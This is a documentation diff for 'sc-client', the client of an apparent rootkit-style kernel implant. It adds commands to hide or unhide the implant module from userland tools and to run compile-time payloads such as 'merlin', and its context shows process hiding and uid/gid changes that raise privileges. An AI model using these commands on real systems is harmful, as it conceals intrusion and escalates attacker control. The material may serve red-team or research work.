@@ -39,12 +39,26 @@ scheduled by the kernel.
 
    $ sc-client hide --pid <pid>
 
+The **sc-client** command line interface allows users to hide the implant
+kernel module. The module is hidden from common userland tools.
+
+.. code-block:: shell
+
+   $ sc-client hide --module
+
 The **sc-client** command line interface allows users to unhide tasks (unhide
 processes). These tasks will become visible to userland applications again.
 
 .. code-block:: shell
 
    $ sc-client unhide --pid <pid>
+
+The **sc-client** command line interface allows users to unhide the implant
+kernel module.
+
+.. code-block:: shell
+
+   $ sc-client unhide --module
 
 The **sc-client** command line interface allows users to modify the state of
 running tasks (running processes). This can be used to elevate or lower the
@@ -65,3 +79,11 @@ modifications they made to running tasks. The previous is stored by
    $ sc-client unset <pid> --uid
    $ sc-client unset <pid> --gid
    $ sc-client unset <pid> --uid --gid
+
+The **sc-client** command line interface allows users to use payloads provided
+at compile time.
+
+.. code-block:: shell
+
+   $ sc-client payload --list
+   $ sc-client payload --exec merlin
